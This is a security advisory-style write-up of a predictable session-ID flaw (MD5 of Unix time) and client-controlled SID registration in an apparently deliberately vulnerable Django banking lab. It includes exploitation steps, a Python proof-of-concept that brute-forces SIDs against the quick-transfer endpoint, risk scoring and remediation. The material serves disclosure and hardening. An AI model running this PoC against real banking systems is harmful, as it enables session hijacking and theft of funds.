# Description

**CWE-330: Use of Insufficiently Random Values**

The banking session identifier (SID) is derived from the current Unix time in whole seconds, passed through MD5. The output is deterministic and depends only on a value that is global and easy to observe or guess, so it carries no secret entropy.

Vulnerable code, `djangoWocshack_5/Bank/Utils/generate.py`:

```python
# generate.py:5-6
def generate_sid():
    return hashlib.md5(str(int(time.time())).encode()).hexdigest()
```

The SID is minted on the Django side in `djangoWocshack_5/Bank/Utils/client.py:143-147` (`make_connection()`), then registered with the banking backend through the `sescr` command (`client.py:77-78`). Each subsequent backend command carries that SID.

A second weakness amplifies the first. The backend stores whatever SID the client supplies:

- `VRC_Banking_System_Backend/Utils/parser.py:24-27` (`create_session`) writes `sessions[sid] = time.time()` for any `sid` in the `sescr` payload, with no check that it came from the server.
- `VRC_Banking_System_Backend/Utils/parser.py:481-494` accepts any command for a SID present in `sessions`.
- `djangoWocshack_5/Bank/views.py:423-431` (`quick_transfer`, `@csrf_exempt` and `@login_required()`) builds the backend payload and runs `payload.update(data)`. Any `sid` the caller sends in the JSON body therefore replaces the server-generated SID.

Because of this, an attacker does not need to predict a victim's SID. The attacker can register their own SID through `quick_transfer` and reuse it. The MD5-of-time weakness still applies to any SID the server mints, and it is what the dev catalog describes (M10): an attacker who knows the approximate creation second of a session can recompute its SID exactly.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Log in to the banking app as any authenticated user to obtain a Django `sessionid` cookie. `quick_transfer` is protected by `@login_required()`. | Authenticated Django session. |
| 2 | Observe a victim's SID or the approximate time their banking session was created (for example from a log line, a captured response, or by triggering a session creation and noting the second). | Target time `t` identified. |
| 3 | Compute candidate SIDs for a window of seconds around `t`: `md5(str(t))`. | List of candidate SIDs. |
| 4 | POST each candidate to `/banking/api/quick-transfer/` with `action` set to a backend command (for example `gu`) and `sid` set to the candidate. `payload.update(data)` overrides the generated SID. | Backend returns `{"status": "success", ...}` when the candidate is in `sessions`. |
| 5 | Alternatively, skip prediction: POST `action: "sescr"` with an attacker-chosen `sid`, then send follow-up commands with that `sid`. The backend registers the SID and accepts it for 300 seconds, refreshed on each use. | Attacker-controlled backend session, usable for any backend command. |
| 6 | Use the accepted SID to read or modify the victim's banking data through the backend command set (`gu`, `tr`, `sb`, `su`, and so on). | Banking-session hijack. |

# PoC

Adapted from the dev catalog README (`poc/m10_sid_predict.py`). It sweeps a window of timestamps, computes MD5 candidates, and submits each one to `quick_transfer`. Run it only against a local, deliberately vulnerable lab instance.

```python
# m10_sid_predict.py
import hashlib
import sys
import time

import requests

target = sys.argv[1]            # e.g. http://localhost:8000
victim_id = int(sys.argv[2])    # e.g. 1
session_cookie = sys.argv[3]    # Django sessionid of any logged-in user
window = 120                    # seconds to search backwards

t_now = int(time.time())

for t in range(t_now - window, t_now + 1):
    sid = hashlib.md5(str(t).encode()).hexdigest()
    try:
        r = requests.post(
            f"{target}/banking/api/quick-transfer/",
            json={"action": "gu", "sid": sid, "user_id": victim_id},
            cookies={"sessionid": session_cookie},
            timeout=5,
        )
    except requests.RequestException:
        continue
    if r.ok:
        body = r.json()
        if body.get("status") == "success" or body.get("success"):
            print(f"[+] valid sid={sid} (t={t})")
            print(body)
            break
else:
    print("[-] no candidate accepted in the window")
```

Note: the command name `gu` and the response shape come from the dev README and were not exercised against a live instance during this write-up. Confirm them against the backend handler before relying on the script.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | An attacker with a valid SID, or the ability to register one, can call backend read commands (`gu`, balance and account lookups) as the victim and read account data. |
| Integrity | The same SID grants write commands (`tr` transfers, `su` updates, and so on), so balances and account state can be changed in the victim's context. |
| Availability | Limited. Session registration and cleanup run on a single backend process, and SID collisions within the same second can cause one session's `sescl` to invalidate another's. |

Overall severity: **High**. This matches the dev catalog CVSS 3.1 score of 7.4 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`). The attack needs an authenticated Django session to reach `quick_transfer`, and the time-window search makes it harder to exploit, which is why the score is not Critical. The unauthenticated-SID registration path in `create_session` raises the practical risk, and it is independent of the MD5 weakness.

# Remediation

1. Replace `generate_sid()` with a cryptographically random token, for example `secrets.token_urlsafe(32)` or `secrets.token_hex(32)`, in `djangoWocshack_5/Bank/Utils/generate.py`. Remove the time-based derivation entirely.
2. Stop accepting client-chosen SIDs. The backend should mint the SID in `create_session` and return it, and the Django side should use only that value. Do not let `sescr` accept a SID from the request.
3. In `quick_transfer` (`djangoWocshack_5/Bank/views.py:431`), do not allow request data to override `sid`. Build the payload from the server-side SID and whitelist the permitted client-supplied fields.
4. Bind each SID to the Django user and client IP at the backend, so that a SID cannot be replayed from another context.
5. Rotate SIDs on privilege boundaries (for example after PIN verification) and invalidate them on logout.
6. Shorten the 300-second idle TTL in `parser.py` for banking sessions, and remove the SID from logs (`Activity/Logger.py:88-93`).

# Author
WOCSA
